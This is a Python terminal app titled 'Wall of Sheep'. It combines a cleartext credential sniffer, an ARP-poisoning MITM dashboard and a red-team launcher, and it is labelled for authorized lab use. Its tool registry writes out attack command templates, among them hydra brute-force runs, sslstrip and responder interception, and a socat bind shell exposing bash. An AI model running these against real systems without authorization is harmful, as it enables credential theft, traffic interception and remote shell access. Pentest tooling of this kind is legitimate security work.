#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║  🐑  WALL OF SHEEP  —  Internal Pentest Monitor                         ║
║  Tab 1 · Wall of Sheep    — Insecure Protocol Sniff & Monitor           ║
║  Tab 2 · Session Dashboard — Compromised Host + Session Map             ║
║  Tab 3 · Red Team          — Tool Launcher + Live Output                ║
╚══════════════════════════════════════════════════════════════════════════╝
For authorized lab / educational use only.
"""

import threading, sys, os, subprocess, shutil
from datetime import datetime
from typing import Optional

from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Container, Horizontal, Vertical
from textual.reactive import reactive
from textual.widgets import (
    Header, Footer, DataTable, RichLog, Static, Label,
    Button, Input, TabbedContent, TabPane, Select,
)
from textual import on
from rich.text import Text

sys.path.insert(0, os.path.dirname(__file__))
from core.sniffer   import SnifferEngine
from core.mitm      import MITMEngine, MITMLogEntry, Session
from core.logger    import DatabaseLogger
from core.protocols import Credential, NetworkEvent, PROTOCOL_COLORS

SEVERITY_COLORS = {
    "critical": "#ff2222", "high": "#ff8800",
    "medium":   "#ffdd00", "info": "#444444",
}

# ═══════════════════════════════════════════════════════════════════════════
#  PENTEST TOOL REGISTRY
#  Keys   = display name shown in the selector
#  Values = shell template ({target} and {iface} are substituted at run time)
# ═══════════════════════════════════════════════════════════════════════════

TOOLS: dict[str, str] = {
    # ── Recon ──────────────────────────────────────────────────────────────
    "nmap · quick (-F)":          "nmap -T4 -F {target}",
    "nmap · full TCP (-p-)":      "nmap -T4 -p- {target}",
    "nmap · service + scripts":   "nmap -sV -sC {target}",
    "nmap · OS detection":        "nmap -O {target}",
    "nmap · UDP top-100":         "nmap -sU --top-ports 100 {target}",
    "arp-scan · local net":       "arp-scan --localnet",
    "netdiscover · passive":      "netdiscover -r {target} -P",
    "dig · DNS ALL":              "dig any {target}",
    "whois":                      "whois {target}",
    "theHarvester":               "theHarvester -d {target} -b all",
    # ── Web ────────────────────────────────────────────────────────────────
    "nikto · web scan":           "nikto -h http://{target}",
    "gobuster · dir fuzz":        "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
    "ffuf · vhost fuzz":          "ffuf -u http://{target} -H 'Host: FUZZ.{target}' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
    "wpscan · WordPress":         "wpscan --url http://{target}",
    "sqlmap · GET id param":      "sqlmap -u 'http://{target}/page?id=1' --batch",
    "sslscan":                    "sslscan {target}",
    # ── Password attacks ───────────────────────────────────────────────────
    "hydra · SSH":                "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}",
    "hydra · FTP":                "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{target}",
    "hydra · HTTP-POST-FORM":     "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
    "hydra · Telnet":             "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://{target}",
    "hydra · POP3":               "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt pop3://{target}",
    "hashcat · MD5 (0)":          "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
    "hashcat · SHA1 (100)":       "hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt",
    "john · auto detect":         "john --wordlist=/usr/share/wordlists/rockyou.txt {target}",
    # ── MITM / Intercept ───────────────────────────────────────────────────
    "bettercap · http.proxy":     "bettercap -iface {iface} -eval 'set http.proxy.sslstrip true; http.proxy on'",
    "mitmproxy · transparent":    "mitmproxy --mode transparent",
    "sslstrip":                   "sslstrip -l 8080",
    "responder · LLMNR/NBT-NS":   "responder -I {iface} -rdwF",
    "ettercap · ARP MITM":        "ettercap -T -M arp:remote /{target}// //",
    # ── Frameworks ─────────────────────────────────────────────────────────
    "metasploit · console":       "msfconsole",
    "msfvenom · list payloads":   "msfvenom -l payloads",
    "searchsploit":               "searchsploit {target}",
    # ── Post-exploitation ──────────────────────────────────────────────────
    "netcat · listener :4444":    "nc -lvnp 4444",
    "netcat · connect":           "nc {target} 4444",
    "socat · bind shell":         "socat TCP-LISTEN:4444,reuseaddr EXEC:bash",
    "tcpdump · write capture":    "tcpdump -i {iface} -w /tmp/cap_{target}.pcap",
    "tshark · HTTP POST":         "tshark -i {iface} -Y 'http.request.method==POST'",
    # ── Wireless ───────────────────────────────────────────────────────────
    "airmon-ng · start":          "airmon-ng start {iface}",
    "airodump-ng · scan":         "airodump-ng {iface}mon",
    "aircrack-ng":                "aircrack-ng -w /usr/share/wordlists/rockyou.txt {target}",
}

CATEGORIES: dict[str, list[str]] = {
    "🔍 Recon":          [k for k in TOOLS if any(x in k for x in ["nmap","arp-scan","netdiscover","dig","whois","Harvester"])],
    "🌐 Web":            [k for k in TOOLS if any(x in k for x in ["nikto","gobuster","ffuf","wpscan","sqlmap","sslscan"])],
    "🔑 Passwords":      [k for k in TOOLS if any(x in k for x in ["hydra","hashcat","john"])],
    "🕸 MITM/Intercept": [k for k in TOOLS if any(x in k for x in ["bettercap","mitmproxy","sslstrip","responder","ettercap"])],
    "💥 Frameworks":     [k for k in TOOLS if any(x in k for x in ["metasploit","msfvenom","searchsploit"])],
    "🐚 Post-Exploit":   [k for k in TOOLS if any(x in k for x in ["netcat","socat","tcpdump","tshark"])],
    "📡 Wireless":       [k for k in TOOLS if any(x in k for x in ["airmon","airodump","aircrack"])],
}


# ═══════════════════════════════════════════════════════════════════════════
#  CSS
# ═══════════════════════════════════════════════════════════════════════════

CSS = """
Screen { background: #050505; color: #00ff41; }
Header { background: #000000; color: #00ff41; text-style: bold; border-bottom: solid #003300; }
Footer { background: #000000; color: #004400; border-top: solid #003300; }

TabbedContent { background: #050505; }
TabbedContent > TabPane { background: #050505; padding: 0; }
Tabs { background: #000000; border-bottom: solid #003300; }
Tab { color: #004400; background: #000000; padding: 0 2; }
Tab.-active { color: #00ff41; background: #001100; border-top: solid #00ff41; text-style: bold; }
Tab:hover { color: #00cc33; }

.panel { border: solid #002200; background: #080808; padding: 0 1; margin: 0; }
.panel-title { color: #00ff41; text-style: bold; background: #001100; padding: 0 1; margin-bottom: 1; }
.panel.danger { border: solid #440000; }
.panel.danger .panel-title { color: #ff4444; background: #1a0000; }
.panel.warn   { border: solid #443300; }
.panel.warn   .panel-title { color: #ffaa00; background: #1a0d00; }

#stats-row { height: 4; background: #000000; border-bottom: solid #002200; }
.stat-box  { border: solid #002200; background: #050505; padding: 0 1; margin: 0 1; min-width: 20; height: 4; }
.stat-lbl  { color: #005500; text-style: bold; }
.stat-val  { color: #00ff41; text-style: bold; }
.stat-hot  { color: #ff4444; text-style: bold; }
#sniff-status { color: #004400; margin: 1 2; }
.s-run  { color: #00ff41; text-style: bold; }
.s-stop { color: #333333; }

DataTable { background: #050505; border: none; height: 1fr; }
DataTable > .datatable--header   { background: #001100; color: #00ff41; text-style: bold; }
DataTable > .datatable--cursor   { background: #002200; color: #00ff88; }
DataTable > .datatable--odd-row  { background: #050505; }
DataTable > .datatable--even-row { background: #080808; }

RichLog { background: #050505; border: none; scrollbar-color: #003300; scrollbar-background: #000000; }

Input  { background: #080808; color: #00ff41; border: solid #003300; }
Input:focus { border: solid #00ff41; }
Select { background: #080808; color: #00ff41; border: solid #003300; min-width: 26; }

Button            { background: #001500; color: #00ff41; border: solid #004400; min-width: 14; }
Button:hover      { background: #002800; border: solid #00ff41; }
Button.-danger    { background: #150000; color: #ff4444; border: solid #550000; }
Button.-danger:hover { background: #280000; border: solid #ff0000; }
Button.-success   { background: #001500; color: #00ff88; border: solid #006600; }
Button.-success:hover { background: #002800; }
Button.-warn      { background: #1a0d00; color: #ffaa00; border: solid #553300; }
Button.-warn:hover { background: #2a1500; }

/* Tab 1 */
#sniff-cfg  { height: auto; padding: 0 1; }
#proto-bar  { height: 3;    padding: 0 1; }
#sheep-tbl  { height: 1fr;  }
#event-log  { height: 14;   }

/* Tab 2 */
#tgt-grid   { height: 11; }
#sess-tbl   { height: 1fr; }
#cred-tl    { height: 1fr; }
#mitm-log   { height: 10; }

/* Tab 3 */
#rt-toolbar { height: auto; padding: 1; }
#rt-row2    { height: auto; padding: 0 1; }
#tool-lib   { width: 30; border: solid #002200; }
#tool-lib-hd{ color: #00ff41; text-style: bold; padding: 0 1; background: #001100; }
#tool-out   { height: 1fr; min-height: 18; }
#rt-pid     { color: #555555; margin: 0 1; }
"""


# ═══════════════════════════════════════════════════════════════════════════
#  Stat box widget
# ═══════════════════════════════════════════════════════════════════════════

class StatBox(Static):
    def __init__(self, label: str, value: str = "0", hot: bool = False, **kw):
        super().__init__(**kw)
        self._lbl = label
        self._val = value
        self._hot = hot
        self._sid = "sv-" + label.lower().replace(" ","_").replace("/","_").replace("#","n")

    def compose(self) -> ComposeResult:
        yield Label(self._lbl, classes="stat-lbl")
        yield Label(self._val, classes="stat-hot" if self._hot else "stat-val", id=self._sid)

    def set_value(self, v: str):
        try: self.query_one(f"#{self._sid}", Label).update(v)
        except Exception: pass


# ═══════════════════════════════════════════════════════════════════════════
#  Main App
# ═══════════════════════════════════════════════════════════════════════════

class SheepWallApp(App):
    TITLE    = "🐑 WALL OF SHEEP  ·  Internal Pentest Monitor"
    CSS      = CSS
    BINDINGS = [
        Binding("q",      "quit",        "Quit"),
        Binding("s",      "do_start",    "Start Sniff"),
        Binding("x",      "do_stop",     "Stop Sniff"),
        Binding("c",      "do_clear",    "Clear"),
        Binding("e",      "do_export",   "Export CSV"),
        Binding("ctrl+c", "quit",        "Quit", show=False),
    ]

    pkt_count  = reactive(0)
    cred_count = reactive(0)
    byte_count = reactive(0)
    sess_count = reactive(0)

    def __init__(self):
        super().__init__()
        self.sniff   = SnifferEngine()
        self.mitm    = MITMEngine()
        self.db      = DatabaseLogger()

        self.sniff.on_credential = lambda c: self.call_from_thread(self._on_cred,     c)
        self.sniff.on_event      = lambda e: self.call_from_thread(self._on_event,    e)
        self.sniff.on_stat       = lambda s: self.call_from_thread(self._on_stat,     s)
        self.mitm.on_log         = lambda e: self.call_from_thread(self._on_mlog,     e)
        self.mitm.on_session     = lambda s: self.call_from_thread(self._on_sess,     s)

        self._creds:   list[Credential]   = []
        self._targets: dict               = {}
        self._ifaces = SnifferEngine.list_interfaces() or ["eth0"]

        self._proc:   Optional[subprocess.Popen]   = None
        self._pth:    Optional[threading.Thread]   = None

    # ────────────────────────────────────────────────────────────────────────
    #  COMPOSE
    # ────────────────────────────────────────────────────────────────────────

    def compose(self) -> ComposeResult:
        yield Header()

        # Stats ribbon
        with Horizontal(id="stats-row"):
            yield StatBox("PACKETS",      "0",      id="bx-pkt")
            yield StatBox("CREDENTIALS",  "0", hot=True, id="bx-cred")
            yield StatBox("DATA KB",      "0",      id="bx-kb")
            yield StatBox("SESSIONS",     "0",      id="bx-sess")
            yield StatBox("TARGETS",      "0",      id="bx-tgt")
            yield Static("", id="stats-spacer")
            yield Label("[ ■ STOPPED ]", id="sniff-status", classes="s-stop")

        with TabbedContent(id="tabs"):

            # ─────────────────────────────────────────────────────────────────
            #  TAB 1 ·  WALL OF SHEEP  —  Insecure Protocol Sniff & Monitor
            # ─────────────────────────────────────────────────────────────────
            with TabPane("🐑  Wall of Sheep", id="tab-sheep"):
                with Vertical():

                    with Horizontal(id="sniff-cfg", classes="panel"):
                        yield Label("Iface:", classes="stat-lbl")
                        yield Select([(i,i) for i in self._ifaces],
                                     value=self._ifaces[0], id="iface-sel")
                        yield Label("  BPF:", classes="stat-lbl")
                        yield Input(placeholder="tcp port 80  (leave blank = all)", id="bpf-in")
                        yield Button("▶ START",  id="btn-start",  classes="-success")
                        yield Button("■ STOP",   id="btn-stop",   classes="-danger")
                        yield Button("🗑 CLEAR",  id="btn-clear")
                        yield Button("💾 EXPORT", id="btn-export")

                    with Horizontal(id="proto-bar", classes="panel"):
                        for p in ["HTTP","FTP","Telnet","SMTP","POP3","IMAP","DNS","ARP"]:
                            c = PROTOCOL_COLORS.get(p,"#ffffff")
                            yield Label(f"[{c}]{p}:0[/]", id=f"pc-{p}", markup=True)

                    with Container(classes="panel"):
                        yield Label("🐑  CLEARTEXT CREDENTIAL CAPTURES", classes="panel-title")
                        yield DataTable(id="sheep-tbl", cursor_type="row")

                    with Container(classes="panel"):
                        yield Label("📡  LIVE EVENT STREAM", classes="panel-title")
                        yield RichLog(id="event-log", highlight=True, markup=True, wrap=False)

            # ─────────────────────────────────────────────────────────────────
            #  TAB 2 ·  ATTACKER / COMPROMISED SESSION DASHBOARD
            # ─────────────────────────────────────────────────────────────────
            with TabPane("⚔  Session Dashboard", id="tab-sessions"):
                with Vertical():

                    # MITM control bar
                    with Horizontal(classes="panel danger"):
                        yield Label("⚔ ARP MITM ▸", classes="stat-lbl")
                        yield Label("Target:", classes="stat-lbl")
                        yield Input(placeholder="192.168.1.101", id="m-tgt")
                        yield Label(" GW:", classes="stat-lbl")
                        yield Input(placeholder="192.168.1.1",   id="m-gw")
                        yield Label(" Iface:", classes="stat-lbl")
                        yield Select([(i,i) for i in self._ifaces],
                                     value=self._ifaces[0], id="m-iface")
                        yield Button("⚡ POISON", id="btn-poison",   classes="-danger")
                        yield Button("■ RESTORE", id="btn-restore",  classes="-success")
                        yield Label("", id="m-status")

                    # Compromised host map
                    with Container(classes="panel"):
                        yield Label("🎯  COMPROMISED HOST MAP  —  discovered targets & risk", classes="panel-title")
                        yield DataTable(id="tgt-grid", cursor_type="row")

                    with Horizontal():
                        # Live sessions
                        with Container(classes="panel"):
                            yield Label("🔗  INTERCEPTED SESSIONS", classes="panel-title")
                            yield DataTable(id="sess-tbl", cursor_type="row")

                        # Credential timeline
                        with Container(classes="panel"):
                            yield Label("🕐  CREDENTIAL TIMELINE", classes="panel-title")
                            yield RichLog(id="cred-tl", highlight=True, markup=True)

                    # MITM log
                    with Container(classes="panel warn"):
                        yield Label("📋  MITM OPERATION LOG", classes="panel-title")
                        yield RichLog(id="mitm-log", highlight=True, markup=True)

            # ─────────────────────────────────────────────────────────────────
            #  TAB 3 ·  RED TEAM DASHBOARD
            # ─────────────────────────────────────────────────────────────────
            with TabPane("🔴  Red Team", id="tab-rt"):
                with Vertical():

                    # Row 1 — tool selector
                    with Horizontal(id="rt-toolbar", classes="panel"):
                        yield Label("Category:", classes="stat-lbl")
                        yield Select(
                            [("── All ──","__ALL__")] + [(c,c) for c in CATEGORIES],
                            value="__ALL__", id="rt-cat",
                        )
                        yield Label(" Tool:", classes="stat-lbl")
                        yield Select(
                            [(k,k) for k in TOOLS],
                            value=list(TOOLS.keys())[0], id="rt-tool",
                        )
                        yield Label(" Target:", classes="stat-lbl")
                        yield Input(placeholder="IP / host / CIDR", id="rt-tgt")
                        yield Label(" Iface:", classes="stat-lbl")
                        yield Select([(i,i) for i in self._ifaces],
                                     value=self._ifaces[0], id="rt-iface")

                    # Row 2 — custom command + action buttons
                    with Horizontal(id="rt-row2", classes="panel"):
                        yield Label("Command:", classes="stat-lbl")
                        yield Input(placeholder="Custom or auto-filled from tool selector", id="rt-cmd")
                        yield Button("▶ RUN",      id="btn-run",    classes="-danger")
                        yield Button("■ KILL",     id="btn-kill",   classes="-success")
                        yield Button("🗑 CLEAR OUT", id="btn-clrout")
                        yield Label("", id="rt-pid")

                    # Main area: tool library sidebar + output
                    with Horizontal():
                        with Vertical(id="tool-lib"):
                            yield Label("🗂 TOOL LIBRARY", id="tool-lib-hd")
                            yield RichLog(id="lib-log", highlight=True, markup=True, wrap=True)

                        with Container(classes="panel"):
                            yield Label("📟  TOOL OUTPUT  —  live subprocess stream", classes="panel-title")
                            yield RichLog(id="tool-out", highlight=True, markup=True, wrap=True)

        yield Footer()

    # ────────────────────────────────────────────────────────────────────────
    #  ON MOUNT
    # ────────────────────────────────────────────────────────────────────────

    def on_mount(self):
        # Tab 1 table
        t = self.query_one("#sheep-tbl", DataTable)
        t.add_columns("⏱", "🖥 Host", "⚡", "👤 User", "🔑 Pass", "Method")

        # Tab 2 tables
        tg = self.query_one("#tgt-grid", DataTable)
        tg.add_columns("🖥 IP", "Hostname", "Protocols", "# Creds", "Last Seen", "Risk")

        st = self.query_one("#sess-tbl", DataTable)
        st.add_columns("ID", "⏱", "Src IP", "Dst IP", "Proto", "Bytes", "Status")

        # Tab 3 library
        self._build_tool_library()

        # Auto-start (demo mode if no scapy)
        self.sniff.start(iface=self._ifaces[0])
        self._set_status(True)

    # ────────────────────────────────────────────────────────────────────────
    #  TAB 1 HANDLERS
    # ────────────────────────────────────────────────────────────────────────

    @on(Button.Pressed, "#btn-start")
    def h_start(self):
        if not self.sniff.running:
            iface = self.query_one("#iface-sel", Select).value or "eth0"
            bpf   = self.query_one("#bpf-in",    Input).value
            self.sniff.start(iface=iface, bpf=bpf)
            self._set_status(True)
            self._elog("[green]▶ Sniffer started[/]")

    @on(Button.Pressed, "#btn-stop")
    def h_stop(self):
        self.sniff.stop()
        self._set_status(False)
        self._elog("[yellow]■ Sniffer stopped[/]")

    @on(Button.Pressed, "#btn-clear")
    def action_do_clear(self):
        self._creds.clear()
        self.query_one("#sheep-tbl", DataTable).clear()
        self.query_one("#event-log", RichLog).clear()

    @on(Button.Pressed, "#btn-export")
    def action_do_export(self):
        path = os.path.expanduser(
            f"~/sheepwall-{datetime.now().strftime('%Y%m%d-%H%M%S')}.csv"
        )
        self.db.export_csv(path)
        self._elog(f"[green]✓ Exported → {path}[/]")

    # ────────────────────────────────────────────────────────────────────────
    #  TAB 2 HANDLERS
    # ────────────────────────────────────────────────────────────────────────

    @on(Button.Pressed, "#btn-poison")
    def h_poison(self):
        tgt = self.query_one("#m-tgt",   Input).value.strip()
        gw  = self.query_one("#m-gw",    Input).value.strip()
        ifc = self.query_one("#m-iface", Select).value or "eth0"
        if not tgt or not gw:
            self.query_one("#m-status", Label).update("[red]⚠ Need target + gateway[/]")
            return
        self.mitm.start(target=tgt, gateway=gw, iface=ifc)
        self.query_one("#m-status", Label).update(f"[red blink]⚡ POISONING {tgt}[/]")

    @on(Button.Pressed, "#btn-restore")
    def h_restore(self):
        self.mitm.stop()
        self.query_one("#m-status", Label).update("[green]■ MITM stopped + ARP restored[/]")

    # ────────────────────────────────────────────────────────────────────────
    #  TAB 3 HANDLERS
    # ────────────────────────────────────────────────────────────────────────

    @on(Select.Changed, "#rt-cat")
    def h_cat(self, evt: Select.Changed):
        sel = self.query_one("#rt-tool", Select)
        if evt.value == "__ALL__":
            sel.set_options([(k,k) for k in TOOLS])
        elif evt.value in CATEGORIES:
            sel.set_options([(k,k) for k in CATEGORIES[evt.value]])

    @on(Select.Changed, "#rt-tool")
    def h_tool_selected(self, evt: Select.Changed):
        """Auto-fill command box when a tool is selected."""
        template = TOOLS.get(str(evt.value), "")
        tgt   = self.query_one("#rt-tgt",   Input).value.strip() or "{target}"
        iface = self.query_one("#rt-iface", Select).value        or "{iface}"
        cmd   = template.replace("{target}", tgt).replace("{iface}", iface)
        try:
            self.query_one("#rt-cmd", Input).value = cmd
        except Exception:
            pass

    @on(Button.Pressed, "#btn-run")
    def h_run(self):
        # Freshen substitutions before running
        template = TOOLS.get(str(self.query_one("#rt-tool", Select).value), "")
        tgt   = self.query_one("#rt-tgt",   Input).value.strip() or "TARGET"
        iface = self.query_one("#rt-iface", Select).value        or "eth0"
        cmd   = template.replace("{target}", tgt).replace("{iface}", iface)
        # Allow manual override in the command box
        cmd_box = self.query_one("#rt-cmd", Input).value.strip()
        if cmd_box:
            cmd = cmd_box
        label = str(self.query_one("#rt-tool", Select).value)
        self._launch(cmd, label)

    @on(Button.Pressed, "#btn-kill")
    def h_kill(self):
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()
            self._tlog("[yellow]■ Process terminated by user[/]")
            try: self.query_one("#rt-pid", Label).update("[yellow]■ KILLED[/]")
            except Exception: pass

    @on(Button.Pressed, "#btn-clrout")
    def h_clrout(self):
        self.query_one("#tool-out", RichLog).clear()

    # ────────────────────────────────────────────────────────────────────────
    #  TOOL LAUNCHER
    # ────────────────────────────────────────────────────────────────────────

    def _launch(self, cmd: str, label: str = ""):
        if not cmd.strip():
            return
        if self._proc and self._proc.poll() is None:
            self._tlog("[red]⚠ A process is already running — kill it first.[/]")
            return

        ts = datetime.now().strftime("%H:%M:%S")
        self._tlog(f"\n[dim]{'─'*68}[/]")
        self._tlog(f"[bold green]▶ [{ts}]  {label}[/]")
        self._tlog(f"[dim cyan]$ {cmd}[/]")
        self._tlog(f"[dim]{'─'*68}[/]\n")

        try:
            self._proc = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
                env={**os.environ, "TERM": "xterm-256color"},
            )
            try:
                self.query_one("#rt-pid", Label).update(f"[green]● PID {self._proc.pid}[/]")
            except Exception:
                pass
            self._pth = threading.Thread(
                target=self._stream, args=(self._proc,), daemon=True
            )
            self._pth.start()
        except Exception as e:
            self._tlog(f"[red]✗ Launch error: {e}[/]")

    def _stream(self, proc: subprocess.Popen):
        try:
            for raw in proc.stdout:
                line = raw.rstrip("\n")
                lo = line.lower()
                if any(x in lo for x in ["error","fail","denied","refused","timeout"]):
                    styled = f"[red]{line}[/]"
                elif any(x in lo for x in ["open","success","found","valid","login","[+]"]):
                    styled = f"[green]{line}[/]"
                elif any(x in lo for x in ["warn","skip","filter","[-]"]):
                    styled = f"[yellow]{line}[/]"
                elif line.startswith("Nmap") or line.startswith("[*]"):
                    styled = f"[cyan]{line}[/]"
                else:
                    styled = f"[dim white]{line}[/]"
                self.call_from_thread(self._tlog, styled)
        except Exception:
            pass
        finally:
            rc = proc.wait()
            clr = "green" if rc == 0 else "red"
            self.call_from_thread(self._tlog, f"\n[{clr}]■ Exited  (rc = {rc})[/]")
            self.call_from_thread(
                lambda: self.query_one("#rt-pid", Label).update(
                    f"[{'green' if rc==0 else 'red'}]■ rc={rc}[/]"
                )
            )

    def _build_tool_library(self):
        log = self.query_one("#lib-log", RichLog)
        for cat, tools in CATEGORIES.items():
            log.write(f"\n[bold green]{cat}[/]")
            for t in tools:
                binary = t.split("·")[0].strip().split()[0]
                found  = shutil.which(binary) is not None
                sym    = "✓" if found else "·"
                col    = "green" if found else "dim"
                log.write(f"  [{col}]{sym} {t}[/]")
        log.write("\n[dim]✓ = found in PATH · = not installed[/]")

    # ────────────────────────────────────────────────────────────────────────
    #  SNIFFER / MITM CALLBACKS  (main-thread safe via call_from_thread)
    # ────────────────────────────────────────────────────────────────────────

    def _on_cred(self, c: Credential):
        self._creds.append(c)
        self.db.log_credential(c)
        self.cred_count += 1
        pc = PROTOCOL_COLORS.get(c.protocol, "#ffffff")

        # Tab 1 — sheep table
        t = self.query_one("#sheep-tbl", DataTable)
        t.add_row(
            Text(c.timestamp,       style="#444444"),
            Text(c.display_host,    style="#00aaff"),
            Text(c.protocol,        style=f"bold {pc}"),
            Text(c.username,        style="#00ff88 bold"),
            Text(c.masked_password, style="#ff4444 bold"),
            Text(c.method,          style="#444444"),
            key=f"c{len(self._creds)}",
        )
        t.move_cursor(row=t.row_count - 1)

        # Tab 1 — event log
        self._elog(
            f"[red bold]🐑[/] [{pc}]{c.protocol}[/]  "
            f"[cyan]{c.display_host}[/]  "
            f"[green]{c.username}[/]:[red]{c.masked_password}[/]  "
            f"[dim]{c.method}[/]"
        )

        # Tab 2 — credential timeline
        try:
            self.query_one("#cred-tl", RichLog).write(
                f"[dim]{c.timestamp}[/]  [{pc}]{c.protocol:<8}[/]  "
                f"[cyan]{c.src_ip:<16}[/]  "
                f"[green]{c.username}[/] [dim]→[/] [red]{c.masked_password}[/]"
            )
        except Exception:
            pass

        # Tab 2 — target map
        self._upsert_target(c.src_ip, c.hostname, c.protocol, cred_delta=1)

    def _on_event(self, ev: NetworkEvent):
        self.db.log_event(ev)
        sc = SEVERITY_COLORS.get(ev.severity, "#444444")
        pc = PROTOCOL_COLORS.get(ev.protocol, "#888888")
        self._elog(
            f"[dim]{ev.timestamp}[/]  "
            f"[{sc}]●[/] [{pc}]{ev.protocol:<7}[/]  "
            f"[cyan]{ev.src_ip:<16}[/] [dim]→[/] "
            f"[blue]{ev.dst_ip:<16}[/]  [dim]{ev.info}[/]"
        )
        # Protocol counter
        try:
            cnt = self.sniff.stats.get(ev.protocol, 0)
            col = PROTOCOL_COLORS.get(ev.protocol, "#ffffff")
            self.query_one(f"#pc-{ev.protocol}", Label).update(
                f"[{col}]{ev.protocol}:{cnt}[/]"
            )
        except Exception:
            pass
        self._upsert_target(ev.src_ip, "", ev.protocol)

    def _on_stat(self, s: dict):
        self.pkt_count  = s.get("total", 0)
        self.byte_count = s.get("bytes", 0) // 1024
        self.cred_count = s.get("credentials", 0)
        try:
            self.query_one("#bx-pkt",  StatBox).set_value(f"{self.pkt_count:,}")
            self.query_one("#bx-cred", StatBox).set_value(f"{self.cred_count:,}")
            self.query_one("#bx-kb",   StatBox).set_value(f"{self.byte_count:,}")
            self.query_one("#bx-tgt",  StatBox).set_value(f"{len(self._targets):,}")
        except Exception:
            pass

    def _on_mlog(self, entry: MITMLogEntry):
        col = {"INFO":"cyan","WARN":"yellow","SUCCESS":"green","ERROR":"red"}.get(entry.level,"white")
        try:
            self.query_one("#mitm-log", RichLog).write(
                f"[dim]{entry.timestamp}[/]  [{col}]{entry.level:<8}[/]  {entry.message}"
            )
        except Exception:
            pass

    def _on_sess(self, sess: Session):
        self.db.log_session(sess)
        self.sess_count += 1
        pc = PROTOCOL_COLORS.get(sess.protocol, "#ffffff")
        sc = {"ACTIVE":"#00ff41","CLOSED":"#555555","HIJACKED":"#ff4444"}.get(sess.status,"#fff")
        try:
            st = self.query_one("#sess-tbl", DataTable)
            st.add_row(
                Text(sess.id,                      style="#666666"),
                Text(sess.start_time,              style="#444444"),
                Text(sess.src_ip,                  style="#00aaff"),
                Text(sess.dst_ip,                  style="#0055aa"),
                Text(sess.protocol,                style=f"bold {pc}"),
                Text(f"{sess.bytes_intercepted:,}",style="#00ff88"),
                Text(sess.status,                  style=f"bold {sc}"),
                key=sess.id,
            )
            self.query_one("#bx-sess", StatBox).set_value(f"{self.sess_count:,}")
        except Exception:
            pass

    # ────────────────────────────────────────────────────────────────────────
    #  TARGET MAP  (Tab 2, compromised host grid)
    # ────────────────────────────────────────────────────────────────────────

    def _upsert_target(self, ip: str, hostname: str = "", proto: str = "", cred_delta: int = 0):
        if not ip or ip in ("local","?","—","DNS"): return
        now = datetime.now().strftime("%H:%M:%S")
        if ip not in self._targets:
            self._targets[ip] = {"host": "", "protos": set(), "creds": 0, "ts": now}
        r = self._targets[ip]
        if hostname: r["host"] = hostname
        if proto:    r["protos"].add(proto)
        r["creds"] += cred_delta
        r["ts"]     = now

        risk = "LOW"
        if r["creds"] >= 3 or any(p in r["protos"] for p in ("Telnet","FTP")):
            risk = "[red bold]CRITICAL[/]"
        elif r["creds"] >= 1 or "HTTP" in r["protos"]:
            risk = "[orange1]HIGH[/]"
        elif r["protos"]:
            risk = "[yellow]MEDIUM[/]"

        protos_str = " ".join(sorted(r["protos"]))
        tg = self.query_one("#tgt-grid", DataTable)
        try:
            tg.add_row(
                Text(ip,              style="#00aaff"),
                Text(r["host"] or "—",style="#888888"),
                Text(protos_str,      style="#00ff88"),
                Text(str(r["creds"]), style="#ff4444 bold" if r["creds"] else "#444444"),
                Text(r["ts"],         style="#444444"),
                Text(risk, markup=True),
                key=f"tgt-{ip}",
            )
        except Exception:
            pass  # Row already exists — DataTable raises on dup key; state already updated above

    # ────────────────────────────────────────────────────────────────────────
    #  HELPERS
    # ────────────────────────────────────────────────────────────────────────

    def _elog(self, msg: str):
        try: self.query_one("#event-log", RichLog).write(msg)
        except Exception: pass

    def _tlog(self, msg: str):
        try: self.query_one("#tool-out", RichLog).write(msg)
        except Exception: pass

    def _set_status(self, on: bool):
        try:
            lbl = self.query_one("#sniff-status", Label)
            if on:
                lbl.update("[ ● SNIFFING ]"); lbl.remove_class("s-stop"); lbl.add_class("s-run")
            else:
                lbl.update("[ ■ STOPPED ]");  lbl.remove_class("s-run");  lbl.add_class("s-stop")
        except Exception: pass

    # Keyboard action dispatchers
    def action_do_start(self):  self.query_one("#btn-start",  Button).press()
    def action_do_stop(self):   self.query_one("#btn-stop",   Button).press()
    def action_do_clear(self):  self.query_one("#btn-clear",  Button).press()
    def action_do_export(self): self.query_one("#btn-export", Button).press()

    def on_unmount(self):
        self.sniff.stop()
        self.mitm.stop()
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()


# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import argparse, core.sniffer as _s
    ap = argparse.ArgumentParser(description="🐑 Wall of Sheep — Internal Pentest Monitor")
    ap.add_argument("--demo", "-d", action="store_true", help="Demo mode (no root/Scapy)")
    ap.add_argument("--iface","-i", default=None)
    args = ap.parse_args()
    if args.demo: _s.SCAPY_OK = False
    SheepWallApp().run()
